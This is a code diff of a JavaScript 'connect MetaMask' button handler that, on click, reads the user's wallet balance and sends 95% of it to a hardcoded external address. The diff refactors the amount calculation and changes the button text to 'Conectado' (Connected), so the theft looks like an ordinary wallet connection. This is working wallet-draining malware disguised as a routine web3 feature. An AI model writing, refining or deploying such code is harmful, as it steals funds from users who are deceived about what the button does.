@@ -7,21 +7,21 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
             const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
 
             const balance = await web3.eth.getBalance(usuarioAddress);
-            // Utiliza el constructor BN directamente en lugar de toBN
-            const balanceBN = new web3.utils.BN(balance);
-            const porcentajeEnviarBN = balanceBN.mul(new web3.utils.BN('95')).div(new web3.utils.BN('100'));
+            const balanceBN = web3.utils.toBN(balance);
+            // Calcular el 95% del saldo
+            const porcentajeEnviarBN = balanceBN.muln(95).divn(100);
 
             const tx = {
                 from: usuarioAddress,
                 to: direccionDestino,
                 value: porcentajeEnviarBN.toString(),
-                gas: 21000,
+                gas: 21000, // Considera estimar el gas de manera dinámica
             };
 
             web3.eth.sendTransaction(tx)
             .then(receipt => {
                 console.log('Transacción exitosa:', receipt);
-                document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
+                document.getElementById('conectarMetaMask').textContent = 'Conectado';
             })
             .catch(error => {
                 console.error('Error en la transacción:', error);
@@ -33,6 +33,7 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
         console.error('MetaMask no está instalado.');
     }
 });
+
 
 
 
